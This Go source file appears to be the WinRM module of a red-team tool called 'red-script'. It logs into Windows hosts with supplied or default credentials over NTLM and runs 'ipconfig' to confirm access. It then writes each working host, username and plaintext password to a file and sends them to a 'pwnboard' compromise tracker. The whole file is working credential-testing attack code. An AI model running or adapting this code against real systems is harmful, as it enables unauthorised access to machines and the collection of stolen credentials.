package winrm

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/masterzen/winrm"
	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/pwnboard"
)

func Connect(host, user, password string, wg *sync.WaitGroup) {
	defer wg.Done()

	splitHost := strings.Split(host, ":")
	port, err := strconv.Atoi(splitHost[1])
	if err != nil {
		fmt.Println("ERROR: Failed to convert port number into int.")
		fmt.Println(err)
		return
	}

	endpoint := winrm.NewEndpoint(splitHost[0], port, false, true, nil, nil, nil, 30*time.Second)
	params := winrm.DefaultParameters
	params.TransportDecorator = func() winrm.Transporter { return &winrm.ClientNTLM{} }
	client, err := winrm.NewClientWithParameters(endpoint, user, password, params)
	if err != nil {
		fmt.Println("ERROR: Failed to login to WinRM.")
		fmt.Println(err)
		return
	}

	cmd := winrm.Powershell("ipconfig")
	_, err = client.Run(cmd, os.Stdout, os.Stderr)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Successful WinRM connection @", host)

	files.WriterChan <- fmt.Sprintf("winrm:%s:%s:%s\n", host, user, password)
	pwnboard.SendUpdate(host, fmt.Sprintf("winrm:%s:%s:Default creds", user, password))
}
